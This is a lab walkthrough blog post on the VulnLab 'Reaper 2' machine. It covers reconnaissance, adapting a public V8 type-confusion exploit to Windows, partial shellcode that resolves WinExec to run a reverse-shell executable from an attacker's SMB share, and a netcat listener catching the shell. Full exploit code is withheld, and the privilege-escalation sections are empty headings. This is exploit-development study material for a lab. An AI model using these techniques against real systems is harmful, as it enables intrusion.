# VulnLab Reaper 2 Walkthrough

## Introduction

[Reaper 2](https://www.vulnlab.com/machines) was the second lab recommended to me for my [OffSec Advanced Windows Exploitation (AWE)](https://www.offsec.com/courses/exp-401/) preperations. It was written by [xct](https://x.com/xct_de) and is part of the training and labs offered by [VulnLab](https://vunlab.com). The lab was rated **Insane** and it didn't dissapoint!

The [wiki](https://wiki.vulnlab.com/guidance/insane/reaper2) for the lab gives several clues that definitely helped me on my journey to pwning it.

In this post I'm going to do something a little different. I am not going to post any full exploit code, and I am not going to write about the way I defeated the lab. I am going to write about how I would take on the lab now I know everything I have learned. So, this isn't going to be a walthrough you can follow, copy and paste a few things and beat the lab. It will act as a guide on how you can approach the lab, and write your own exploits to get `SYSTEM` access to **Reaper 2**.

I will be showing how this can all be done **without** using the clues given in in the [wiki](https://wiki.vulnlab.com/guidance/insane/reaper2). Let's go!

## Initial Access

### Reconnaissance

As with most labs you can start with an `nmap` scan to see what services are running on the target:

```
nmap reaper2.vulnlab.local -Pn -p- 
...
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49668/tcp open  unknown
```

It's a Windows operating system, as expected. It has the **RPC** and **SMB** ports open and it also has a web service running on **HTTP**, and Terminal Services (**RDP**).

#### HTTP

Visiting the website we are presented with the following:

<img width="835" alt="Screenshot 2024-08-25 at 13 55 12" src="https://github.com/user-attachments/assets/91cf2196-e8a8-45e2-9890-b7c9250f3ea8">


From here we can input some JavaScript and the **V8** engine will process it and display the output. We can test this with an input of `print(version());`, and we will get an output of `12.2.0 (candidate)`. What is even more interesting is that if we look at the source code in the returned web page we will see:

```html
<!-- Completed: d8.exe --allow-natives-syntax --harmony-set-methods data.js -->
```

We have arbitrary JavaScript code input into **D8**. **D8** is a lightweight, standalone command-line interpreter for the **V8** JavaScript engine. It's primarily used for testing and debugging JavaScript code and **V8** itself. We also observe that the `--allow-natives-syntax --harmony-set-methods` arguments are being used.

#### SMB Shares

We should also enumerate the **SMB** shares on the target as these will help us to exploit the target.

```
 crackmapexec smb reaper2.vulnlab.local -u guest -p '' --shares
SMB         reaper2.vulnlab.local   445    REAPER2          [*] Windows 10.0 Build 20348 x64 (name:REAPER2) (domain:Reaper2) (signing:False) (SMBv1:False)
SMB         reaper2.vulnlab.local   445    REAPER2          [+] Reaper2\guest: 
SMB         reaper2.vulnlab.local   445    REAPER2          [+] Enumerated shares
SMB         reaper2.vulnlab.local   445    REAPER2          Share           Permissions     Remark
SMB         reaper2.vulnlab.local   445    REAPER2          -----           -----------     ------
SMB         reaper2.vulnlab.local   445    REAPER2          ADMIN$                          Remote Admin
SMB         reaper2.vulnlab.local   445    REAPER2          C$                              Default share
SMB         reaper2.vulnlab.local   445    REAPER2          IPC$            READ            Remote IPC
SMB         reaper2.vulnlab.local   445    REAPER2          software$       READ            software developement share
```

The `software$` looks interesting and we can connect to it using **smbclient**:

```
smbclient //reaper2.vulnlab.local/software$ 
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Apr 28 20:31:48 2024
  ..                                DHS        0  Mon Apr 29 14:01:57 2024
  kernel                              D        0  Sun Apr 28 13:26:32 2024
  v8_debug                            D        0  Thu May  9 20:33:23 2024
  v8_release                          D        0  Sun Apr 28 10:39:11 2024

		6126847 blocks of size 4096. 2388806 blocks available
```

We should download copies of all the files we find, this includes `v8_debug.zip`, `v8_release`, `d8.exe`, `snapshot_blob.bin`, and `kernel32.dll`. We cannot download `Reaper.sys` but don't worry about that for now.

These files have been provided by `xct` to make debugging and writing your exploit easier. The **V8** and **D8** files mean you don't have to build the environemnt yourself, and the `kernel32.dll` file will come in handy later when we need to use some Win32 API offsets.

### Type Confusion Bug

It turns out there is a documented [explanation and walkthrough](https://h0meb0dy-me.translate.goog/entry/Issue-1510709-Type-confusion-in-Harmony-Set-methods-leads-to-RCE?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp) of a **type confusion** bug in this version of **D8** whilst running with the `--harmony-set-methods` argument. The bad news for us is the walkthrough is written for **Linux**.

Our challenge at this point is to convert the exploit so it will run against a **Windows Server 2022** target.

I recommed you spend a bit of time disecting the exploit and understanding how it works, this will really help when it comes to writing your own shellcode.

### Exploitation

I found a useful blog by [Jake Halon](https://jhalon.github.io/chrome-browser-exploitation-1/) which explained some important **V8** concepts when I was trying to understand it's internals: such as **Pointer Tagging** and **Pointer Compression**.

We can use most of the exploit documented by `h0meb0dy` but we do need to make some changes.

The first thing we need to consider is the fake array used in the exploit uses a `PACKED_DOUBLE_ELEMENTS` mapping, the value for this is different on the target. To find this we can run the following code **on the target** (using the Reaper Calculator):

```
d8> a = [1.1];
[1.1]
d8> %DebugPrint(a);
DebugPrint: 000000870004D9C5: [JSArray]
 - map: [...]
```

The second change is we need to write shellcode that will run on **Windows**. Essentially we need to change the `let wasmCode = new Uint8Array([...` line.

This was a painful process because of the JIT compiler restrictions outlined by `h0meb0dy`.

Essentially I wrote my shellcode in chunks of 8 bytes:

```asm
locate_kernel32:
    xor rcx, rcx                    ; zero out rcx
    nop                             ;
    nop                             ;
    nop                             ;
    jmp 0x0f                        ;

    add rcx, 0x60                   ; the _PEB is at an offset of 0x60 from gs
    nop                             ;
    nop                             ;
    jmp 0x17                        ;

    mov rax, gs:[rcx]               ; rax = _PEB
    nop                             ;
    nop                             ;
    jmp 0x1f                        ; 
...
```

**Notice** the jump instructions, the reason for these are outlined in the blog, and also note that two chunks cannot be identical or they will be optimised (essentially removed from your shellcode). The jump gap changes at certain points along, you will need to detect these as you are debugging.

I wrote a **python** script to take my `asm` and convert it to `wasm` (in text format `wat`): [asm2wasm.py](https://github.com/plackyhacker/misc-scripts/blob/main/awe-prep/asm2wasm.py). It's a bit of a Frankenstein, but it worked for me.

It does some checks on my `asm`, it then compiles it using `nasm`, it formats the assembly into a JavaScript array and builds and executes the `shellcode.js` file to output the `wasm` code:

```wat
(module
  (func (export "main")
    f64.const 1.6305244900842146e-270
    f64.const 1.6305241091952572e-270
    f64.const 1.6305237735001968e-270
    f64.const 1.6305238535635708e-270
...
```

I then used the [wat2wasm demo website]([https://webassembly.github.io/wabt/demo/wasm2wat/](https://webassembly.github.io/wabt/demo/wat2wasm/)) to convert my `wat` code to a `wasm` file. We can enter our text and download the `wasm` file.

Then we can use the follow **python** script to get the JavaScript array for our exploit:

```python
with open('..\\test.wasm', 'rb') as f:
    wasmCode = f.read()

wasmCode_arr = []
for c in wasmCode:
    wasmCode_arr.append(c)

print(str(wasmCode_arr))
```

Essentially my shellcode does the following:

- Locates the base address of `kernel32`.
- Resolves `WinExec`, this is done by examining the `kernel32.dll` file and finding the offset of `WinExec` then adding it to the base of `kernel32`:

```asm
; r15 = base address of kernel32
resolve_winexec:
    mov ebx, [offset]               ; mov the offset of WinExec in to ebx
    nop                             ; 
    jmp 0x14                        ;

    add rbx, r15                    ; add kernel base to WinExec offset
    mov r14, rbx                    ; mov the address of WinExec in to r14
    jmp 0x1c                        ; this is to defeat the JIT restrictions
```

- Pushes a string on the stack. This is an SMB share on my kali host, with a reverse shell executable.
- Calls `WinExec` using 64-bit calling conventions.

I set up a **SMB** share on my kali host. I hosted a reverse shell and executed my final JavaScript exploit in the Reaper Calculator:

```
nc -nvlp 4443
listening on [any] 443 ...
connect to [10.8.2.195] from (UNKNOWN) [10.10.102.190] 49712
Microsoft Windows [Version 10.0.20348.2402]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

### Enumeration



## Privilege Escalation

### Enumeration

### Custom Driver

### Kernel Base Address Disclosure Bug

### Arbitrary Code Execution Bug

### Kernel Debugging

### Exploitation
